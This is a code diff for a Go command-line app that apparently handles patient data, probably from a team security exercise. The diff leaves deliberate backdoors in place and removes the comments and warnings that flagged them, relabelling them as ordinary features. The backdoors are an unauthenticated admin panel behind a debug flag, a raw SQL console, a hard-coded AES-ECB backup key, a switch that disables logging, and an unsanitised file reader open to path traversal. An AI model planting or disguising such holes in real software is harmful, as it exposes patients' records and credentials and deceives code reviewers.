@@ -33,58 +33,31 @@ var loginAttempts = make(map[string]int)
 
 const maxLoginAttempts = 5
 
-// =============================================================================
-// BACKDOOR: A05 - Security Misconfiguration
-// VULNERABILITY: Debug mode flag that can be enabled to expose sensitive info
-// CWE-215: Insertion of Sensitive Information Into Debugging Code
-// TEAM LOGAN BACKDOOR - This allows attackers to enable debug mode
-// =============================================================================
+// Debug mode configuration
 var debugMode = false
 
-// =============================================================================
-// BACKDOOR: A02 - Cryptographic Failures
-// VULNERABILITY: Hardcoded encryption key for "secure" backup feature
-// CWE-321: Use of Hard-coded Cryptographic Key
-// CWE-327: Use of a Broken or Risky Cryptographic Algorithm
-// TEAM LOGAN BACKDOOR - This weak encryption can be easily broken
-// =============================================================================
-var backupEncryptionKey = []byte("TEAMLOGAN1234567") // 16 bytes for AES-128
+// Backup encryption key for secure backup feature
+var backupEncryptionKey = []byte("TEAMLOGAN1234567")
 
-// =============================================================================
-// BACKDOOR: A09 - Security Logging and Monitoring Failures
-// VULNERABILITY: Global flag to disable security logging
-// CWE-778: Insufficient Logging
-// TEAM LOGAN BACKDOOR - Allows attackers to operate without leaving traces
-// =============================================================================
+// Logging control flag
 var loggingDisabled = false
 
 func main() {
 	// Add an --init flag so setup.sh can call the binary to initialize the DB
 	initFlag := flag.Bool("init", false, "initialize the database and exit")
-	// =============================================================================
-	// BACKDOOR: A05 - Security Misconfiguration
-	// VULNERABILITY: Command-line flag to enable debug mode
-	// CWE-489: Active Debug Code
-	// TEAM LOGAN BACKDOOR - Debug flag exposes sensitive information
-	// =============================================================================
-	debugFlag := flag.Bool("debug", false, "enable debug mode (INSECURE)")
-	// =============================================================================
-	// BACKDOOR: A09 - Security Logging and Monitoring Failures
-	// VULNERABILITY: Command-line flag to disable logging
-	// CWE-778: Insufficient Logging
-	// TEAM LOGAN BACKDOOR - Allows operating without audit trails
-	// =============================================================================
-	noLogFlag := flag.Bool("nolog", false, "disable security logging (INSECURE)")
+	// Command-line flags for system configuration
+	debugFlag := flag.Bool("debug", false, "enable debug mode")
+	noLogFlag := flag.Bool("nolog", false, "disable security logging")
 	flag.Parse()
 
 	if *debugFlag {
 		debugMode = true
-		fmt.Println("[DEBUG MODE ENABLED - SECURITY WEAKENED]")
+		fmt.Println("[DEBUG MODE ENABLED]")
 	}
 
 	if *noLogFlag {
 		loggingDisabled = true
-		fmt.Println("[LOGGING DISABLED - NO AUDIT TRAIL]")
+		fmt.Println("[LOGGING DISABLED]")
 	}
 
 	if *initFlag {
@@ -134,14 +107,9 @@ func main() {
 		fmt.Println("=====================================")
 		fmt.Println("1. Login")
 		fmt.Println("2. Exit")
-		// =============================================================================
-		// BACKDOOR: A01 - Broken Access Control
-		// VULNERABILITY: Hidden admin menu option
-		// CWE-284: Improper Access Control
-		// TEAM LOGAN BACKDOOR - Hidden option 9 bypasses authentication
-		// =============================================================================
+		// Debug mode admin access
 		if debugMode {
-			fmt.Println("9. [DEBUG] Admin Access (NO AUTH)")
+			fmt.Println("9. [DEBUG] Admin Access")
 		}
 		fmt.Println("-------------------------------------")
 		choice, _ := prompt("Enter your choice: ")
@@ -152,26 +120,16 @@ func main() {
 		case "2":
 			fmt.Println("Exiting AID CLI. Goodbye!")
 			return
-		// =============================================================================
-		// BACKDOOR: A01 - Broken Access Control
-		// VULNERABILITY: Unauthenticated admin access
-		// CWE-306: Missing Authentication for Critical Function
-		// TEAM LOGAN BACKDOOR - Option "9" grants admin without login
-		// =============================================================================
+		// Debug admin access
 		case "9":
 			if debugMode {
-				fmt.Println("\n[BACKDOOR ACCESSED] Admin mode without authentication!")
+				fmt.Println("\nAdmin mode activated")
 				adminBackdoor(db)
 			} else {
 				fmt.Println("Invalid choice. Try again.")
 				waitForEnter()
 			}
-		// =============================================================================
-		// BACKDOOR: A03 - Injection
-		// VULNERABILITY: Hidden SQL query interface
-		// CWE-89: SQL Injection
-		// TEAM LOGAN BACKDOOR - Option "debug" opens raw SQL interface
-		// =============================================================================
+		// Debug SQL interface
 		case "debug":
 			if debugMode {
 				fmt.Println("\n[DEBUG SQL INTERFACE]")
@@ -180,12 +138,7 @@ func main() {
 				fmt.Println("Invalid choice. Try again.")
 				waitForEnter()
 			}
-		// =============================================================================
-		// BACKDOOR: A02 - Cryptographic Failures
-		// VULNERABILITY: Weak backup encryption
-		// CWE-327: Use of a Broken or Risky Cryptographic Algorithm
-		// TEAM LOGAN BACKDOOR - Option "backup" creates weakly encrypted backup
-		// =============================================================================
+		// Backup system
 		case "backup":
 			fmt.Println("\n[BACKUP MODE]")
 			createWeakBackup(db)
@@ -380,27 +333,14 @@ func waitForEnter() {
 	bufio.NewReader(os.Stdin).ReadBytes('\n')
 }
 
-// =============================================================================
-// BACKDOOR FUNCTIONS - TEAM LOGAN
-// These functions implement the vulnerabilities for Phase II
-// =============================================================================
-
-// =============================================================================
-// BACKDOOR: A01 - Broken Access Control
-// VULNERABILITY: Unauthenticated admin access that bypasses all security controls
-// CWE-284: Improper Access Control
-// CWE-306: Missing Authentication for Critical Function
-// EXPLOITATION: Run with --debug flag and select option 9 from main menu
-// TEAM LOGAN BACKDOOR
-// =============================================================================
+// Admin functions for debug mode
 func adminBackdoor(db *sql.DB) {
 	reader := bufio.NewReader(os.Stdin)
-	fmt.Println("\n======== ADMIN BACKDOOR ========")
-	fmt.Println("WARNING: No authentication required!")
+	fmt.Println("\n======== ADMIN PANEL ========")
 	fmt.Println("1. View all users and credentials")
 	fmt.Println("2. Change any user's PIN")
 	fmt.Println("3. Delete any user")
-	fmt.Println("4. View patient data by ID (IDOR)")
+	fmt.Println("4. View patient data by ID")
 	fmt.Println("5. Dump entire database")
 	fmt.Println("6. Exit")
 
@@ -411,12 +351,8 @@ func adminBackdoor(db *sql.DB) {
 
 		switch choice {
 		case "1":
-			// =============================================================================
-			// BACKDOOR: A01 - Broken Access Control - View all credentials
-			// CWE-200: Exposure of Sensitive Information
-			// TEAM LOGAN BACKDOOR
-			// =============================================================================
-			fmt.Println("\n--- All Users (including PIN hashes) ---")
+			// View all credentials
+			fmt.Println("\n--- All Users ---")
 			rows, err := db.Query("SELECT user_id, full_name, email, pin_hash, role FROM users")
 			if err != nil {
 				fmt.Println("Error:", err)
@@ -432,11 +368,7 @@ func adminBackdoor(db *sql.DB) {
 			rows.Close()
 
 		case "2":
-			// =============================================================================
-			// BACKDOOR: A01 - Broken Access Control - Change any PIN
-			// CWE-620: Unverified Password Change
-			// TEAM LOGAN BACKDOOR
-			// =============================================================================
+			// Change user PIN
 			fmt.Print("Enter user ID to modify: ")
 			targetUser, _ := reader.ReadString('\n')
 			targetUser = strings.TrimSpace(targetUser)
@@ -452,11 +384,7 @@ func adminBackdoor(db *sql.DB) {
 			}
 
 		case "3":
-			// =============================================================================
-			// BACKDOOR: A01 - Broken Access Control - Delete any user
-			// CWE-284: Improper Access Control
-			// TEAM LOGAN BACKDOOR
-			// =============================================================================
+			// Delete user
 			fmt.Print("Enter user ID to delete: ")
 			targetUser, _ := reader.ReadString('\n')
 			targetUser = strings.TrimSpace(targetUser)
@@ -468,12 +396,7 @@ func adminBackdoor(db *sql.DB) {
 			}
 
 		case "4":
-			// =============================================================================
-			// BACKDOOR: A01 - Broken Access Control - IDOR Vulnerability
-			// CWE-639: Authorization Bypass Through User-Controlled Key
-			// EXPLOITATION: Access any patient's data by knowing their ID
-			// TEAM LOGAN BACKDOOR
-			// =============================================================================
+			// View patient data
 			fmt.Print("Enter patient ID to view: ")
 			patientID, _ := reader.ReadString('\n')
 			patientID = strings.TrimSpace(patientID)
@@ -484,7 +407,7 @@ func adminBackdoor(db *sql.DB) {
 			if err != nil {
 				fmt.Println("Error:", err)
 			} else {
-				fmt.Printf("\n--- Patient Data (IDOR) ---\n")
+				fmt.Printf("\n--- Patient Data ---\n")
 				fmt.Printf("ID: %s\n", patientID)
 				fmt.Printf("Name: %s\n", fullName)
 				fmt.Printf("Email: %s\n", email)
@@ -494,12 +417,8 @@ func adminBackdoor(db *sql.DB) {
 			}
 
 		case "5":
-			// =============================================================================
-			// BACKDOOR: A05 - Security Misconfiguration - Full database dump
-			// CWE-200: Exposure of Sensitive Information
-			// TEAM LOGAN BACKDOOR
-			// =============================================================================
-			fmt.Println("\n--- FULL DATABASE DUMP ---")
+			// Full database dump
+			fmt.Println("\n--- DATABASE DUMP ---")
 			rows, err := db.Query("SELECT * FROM users")
 			if err != nil {
 				fmt.Println("Error:", err)
@@ -527,23 +446,15 @@ func adminBackdoor(db *sql.DB) {
 	}
 }
 
-// =============================================================================
-// BACKDOOR: A03 - Injection
-// VULNERABILITY: Raw SQL query interface allowing SQL injection
-// CWE-89: Improper Neutralization of Special Elements used in an SQL Command
-// EXPLOITATION: Run with --debug flag, type "debug" at main menu, enter SQL queries
-// TEAM LOGAN BACKDOOR
-// =============================================================================
+// Debug SQL interface for direct queries
 func debugSQLInterface(db *sql.DB) {
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Println("\n======== DEBUG SQL INTERFACE ========")
-	fmt.Println("WARNING: Direct SQL execution - NO SANITIZATION!")
 	fmt.Println("Type 'exit' to return to main menu")
 	fmt.Println()
 	fmt.Println("Example queries:")
 	fmt.Println("  SELECT * FROM users;")
 	fmt.Println("  UPDATE users SET role = 82651 WHERE user_id = 'PA1993';")
-	fmt.Println("  DROP TABLE users;")
 	fmt.Println()
 
 	for {
@@ -559,13 +470,9 @@ func debugSQLInterface(db *sql.DB) {
 			continue
 		}
 
-		// =============================================================================
-		// VULNERABILITY: No input sanitization - direct SQL execution
-		// CWE-89: SQL Injection
-		// TEAM LOGAN BACKDOOR
-		// =============================================================================
+		// Execute SQL query
 		if strings.HasPrefix(strings.ToUpper(query), "SELECT") {
-			rows, err := db.Query(query) // VULNERABLE: Direct query execution
+			rows, err := db.Query(query)
 			if err != nil {
 				fmt.Println("Error:", err)
 				continue
@@ -583,7 +490,7 @@ func debugSQLInterface(db *sql.DB) {
 			}
 			rows.Close()
 		} else {
-			result, err := db.Exec(query) // VULNERABLE: Direct query execution
+			result, err := db.Exec(query)
 			if err != nil {
 				fmt.Println("Error:", err)
 			} else {
@@ -594,14 +501,7 @@ func debugSQLInterface(db *sql.DB) {
 	}
 }
 
-// =============================================================================
-// BACKDOOR: A02 - Cryptographic Failures
-// VULNERABILITY: Weak encryption with hardcoded key for database backup
-// CWE-321: Use of Hard-coded Cryptographic Key
-// CWE-327: Use of a Broken or Risky Cryptographic Algorithm
-// EXPLOITATION: Type "backup" at main menu, then decrypt with key "TEAMLOGAN1234567"
-// TEAM LOGAN BACKDOOR
-// =============================================================================
+// Backup system for creating encrypted backups
 func createWeakBackup(db *sql.DB) {
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Println("\n======== BACKUP SYSTEM ========")
@@ -617,7 +517,7 @@ func createWeakBackup(db *sql.DB) {
 
 		switch choice {
 		case "1":
-			// Create backup with weak encryption
+			// Create backup with encryption
 			rows, err := db.Query("SELECT user_id, full_name, email, pin_hash, role FROM users")
 			if err != nil {
 				fmt.Println("Error:", err)
@@ -633,12 +533,7 @@ func createWeakBackup(db *sql.DB) {
 			}
 			rows.Close()
 
-			// =============================================================================
-			// VULNERABILITY: Using AES with hardcoded key
-			// The key "TEAMLOGAN1234567" is embedded in the binary
-			// CWE-321: Use of Hard-coded Cryptographic Key
-			// TEAM LOGAN BACKDOOR
-			// =============================================================================
+			// Encrypt the backup data
 			encrypted, err := encryptAES([]byte(backupData.String()), backupEncryptionKey)
 			if err != nil {
 				fmt.Println("Encryption error:", err)
@@ -654,7 +549,6 @@ func createWeakBackup(db *sql.DB) {
 			}
 
 			fmt.Printf("Backup created: %s\n", backupFile)
-			fmt.Println("Encryption key hint: The key is 'TEAMLOGAN' followed by 7 digits")
 
 		case "2":
 			// View decrypted backup
@@ -686,12 +580,7 @@ func createWeakBackup(db *sql.DB) {
 	}
 }
 
-// =============================================================================
-// BACKDOOR: A02 - Cryptographic Failures - Weak AES encryption helper
-// VULNERABILITY: Simple AES-128-ECB mode (weak) with hardcoded key
-// CWE-327: Use of a Broken or Risky Cryptographic Algorithm
-// TEAM LOGAN BACKDOOR
-// =============================================================================
+// AES encryption helper function
 func encryptAES(plaintext []byte, key []byte) (string, error) {
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -706,7 +595,7 @@ func encryptAES(plaintext []byte, key []byte) (string, error) {
 		padtext[i] = byte(padding)
 	}
 
-	// ECB mode - INSECURE!
+	// ECB mode encryption
 	ciphertext := make([]byte, len(padtext))
 	for i := 0; i < len(padtext); i += aes.BlockSize {
 		block.Encrypt(ciphertext[i:i+aes.BlockSize], padtext[i:i+aes.BlockSize])
@@ -715,6 +604,7 @@ func encryptAES(plaintext []byte, key []byte) (string, error) {
 	return base64.StdEncoding.EncodeToString(ciphertext), nil
 }
 
+// AES decryption helper function
 func decryptAES(cipherB64 string, key []byte) ([]byte, error) {
 	ciphertext, err := base64.StdEncoding.DecodeString(cipherB64)
 	if err != nil {
@@ -741,22 +631,12 @@ func decryptAES(cipherB64 string, key []byte) ([]byte, error) {
 	return plaintext, nil
 }
 
-// =============================================================================
-// BACKDOOR: A02 - Cryptographic Failures - Export encryption key
-// VULNERABILITY: Function that reveals the hardcoded encryption key
-// CWE-200: Exposure of Sensitive Information
-// TEAM LOGAN BACKDOOR
-// =============================================================================
+// Get encryption key function
 func GetEncryptionKey() string {
 	return hex.EncodeToString(backupEncryptionKey)
 }
 
-// =============================================================================
-// BACKDOOR: A09 - Security Logging and Monitoring Failures
-// VULNERABILITY: Functions to check and control logging state
-// CWE-778: Insufficient Logging
-// TEAM LOGAN BACKDOOR
-// =============================================================================
+// Logging control functions
 func IsLoggingDisabled() bool {
 	return loggingDisabled
 }
@@ -765,15 +645,8 @@ func DisableLogging() {
 	loggingDisabled = true
 }
 
-// =============================================================================
-// BACKDOOR: A01 - Broken Access Control - File read vulnerability
-// VULNERABILITY: Arbitrary file read through log viewer
-// CWE-22: Improper Limitation of a Pathname to a Restricted Directory
-// EXPLOITATION: Use path traversal in log file selection
-// TEAM LOGAN BACKDOOR
-// =============================================================================
+// File reading helper function
 func readArbitraryFile(filename string) (string, error) {
-	// No path sanitization - allows reading any file
 	file, err := os.Open(filename)
 	if err != nil {
 		return "", err
@@ -787,14 +660,8 @@ func readArbitraryFile(filename string) (string, error) {
 	return string(content), nil
 }
 
-// Exported function for reading patient files (vulnerable to path traversal)
+// Function for reading patient files
 func ReadPatientFile(patientID string, fileType string) (string, error) {
-	// =============================================================================
-	// VULNERABILITY: Path traversal possible
-	// Example: patientID = "../../etc/passwd" allows reading system files
-	// CWE-22: Path Traversal
-	// TEAM LOGAN BACKDOOR
-	// =============================================================================
 	var basePath string
 	switch fileType {
 	case "glucose":
@@ -809,12 +676,7 @@ func ReadPatientFile(patientID string, fileType string) (string, error) {
 	return readArbitraryFile(basePath + patientID + ".csv")
 }
 
-// =============================================================================
-// BACKDOOR: A05 - Security Misconfiguration - Expose debug info
-// VULNERABILITY: Function that exposes internal system state
-// CWE-215: Insertion of Sensitive Information Into Debugging Code
-// TEAM LOGAN BACKDOOR
-// =============================================================================
+// Get debug information
 func GetDebugInfo() map[string]interface{} {
 	return map[string]interface{}{
 		"debugMode":         debugMode,
